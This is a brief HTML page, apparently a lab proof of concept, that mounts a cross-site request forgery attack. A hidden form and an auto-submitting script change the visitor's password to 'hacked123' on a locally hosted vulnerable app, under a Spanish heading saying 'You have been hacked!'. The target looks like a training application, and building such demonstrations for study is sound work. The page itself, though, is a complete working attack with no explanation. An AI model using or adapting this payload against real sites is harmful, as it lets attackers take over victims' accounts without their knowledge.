<html>
  <body>
    <h1>¡Has sido hackeado!</h1>
    <form action="http://localhost/vulnerabilities/csrf/">
      <input type="hidden" name="password_new" value="hacked123" />
      <input type="hidden" name="password_conf" value="hacked123" />
      <input type="hidden" name="Change" value="Change" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
